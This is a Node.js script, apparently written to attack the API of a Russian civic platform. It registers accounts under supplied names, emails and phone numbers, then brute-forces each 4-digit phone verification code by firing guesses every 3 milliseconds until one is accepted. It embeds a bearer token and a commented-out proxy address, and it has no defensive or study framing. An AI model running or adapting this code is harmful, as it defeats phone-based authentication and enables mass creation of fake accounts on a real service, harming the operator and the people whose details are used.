var _ = require('lodash');
var _ = require('lodash/core');
var fp = require('lodash/fp');
var padStart = require('lodash/padStart')

const axios = require('axios');
fs = require('fs');

function clock(start) {
    if ( !start ) return process.hrtime();
    var end = process.hrtime(start);
    return Math.round((end[0]*1000) + (end[1]/1000000));
}

const instance = axios.create({
    baseURL: 'https://api.za.gorodsreda.ru/v1',
    // proxy: {
    //     host: '34.118.61.17',
    //     port: 3128
    // },
    headers: {
        "accept": "application/json, text/plain, *\/*",
        "accept-language": "ru-UA,ru;q=0.9,uk-UA;q=0.8,uk;q=0.7,ru-RU;q=0.6,en-US;q=0.5,en;q=0.4",
        "authorization": "Bearer NJ4cWN7hLGujEjfbtkoKNjipjORTsrFE_1619614767",
        "content-type": "application/json;charset=UTF-8",
        "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site"
    }
});

var my_interval;
const brute_code = async (personUid, callback) => {
    var count = 0;
    var start = clock();
    my_interval = setInterval(async () => {
        count++
        let code = padStart(count, 4, '0');
        await instance.post('/phone-auth/call-code', {personUid, code})
        .then(res => {
            var taken_time = clock(start);
            count = 0;
            callback(null, {success: true, response: {code: JSON.parse(res.config.data).code, data: res.data, time: taken_time / 1000}})
        })
        .catch(err => {
            if (code % 100 == 0) console.log(code)
            // console.log(err.response.data)
        })
    }, 3)
}

const register_account = async (first_name, lastName, middle_name, email, phone_number, callback) => {  // Фамилия | Имя | Отчество | емейл | телефон
    if(!first_name || !lastName || !middle_name || !email || !phone_number) return;
    const response = await instance.post('/person', {
        agreements: {
            agreementEmail: false,
            agreementFullName: false,
            agreementIdentityFiles: false,
            agreementPhone: false
        },
        firstName: first_name,
        lastName: lastName,
        patronymic: middle_name,
        email,
        phone: phone_number
    })  
    .catch(err => {})
    if(response?.data?.success == undefined) return callback(null, {success:false, error: "Number already taken."}) 

    if(response.data.success) {
        const data = response.data.data;
        const {personUid} = data;
        if(!personUid) return callback(null, {success:false, error: "No personUid."}) 
        
        const request_code = await instance.post('/phone-auth/call-to', {personUid})
        .catch(err => {})
        if(request_code?.data == undefined) return callback(null, {success:false, error: "Message already sent."}) 

        if(request_code.data) {
            brute_code(personUid, (err, result) => {
                clearInterval(my_interval);
                console.log({...result, first_name, lastName, email, phone_number});
                return callback(null, {...result, first_name, lastName, email, phone_number});
            })
        }
    }
}


module.exports = {
    register_account
}